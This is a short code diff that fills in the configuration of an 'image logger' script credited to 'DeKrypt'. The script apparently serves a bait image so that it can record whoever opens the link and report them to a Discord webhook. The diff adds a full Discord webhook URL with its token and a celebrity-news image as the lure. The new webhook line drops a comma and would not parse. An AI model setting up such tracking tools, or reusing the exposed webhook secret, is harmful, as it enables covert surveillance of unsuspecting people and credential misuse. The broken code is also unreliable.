@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1343134805449244693/c_SthwfgBgIbV4NofnYgXSGMkbEfyESLp96ut1HnACtkwTfgwjObZMZqqVEVK6sE1Qu0"
+    "image": "https://media.assettype.com/cinemaexpress%2F2024-10-19%2Fs7pyx0q8%2Fbigg-boss-tamil-season-8-starting-date-time-new-host-promo-video-contestants-list-20240904194802-5943.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
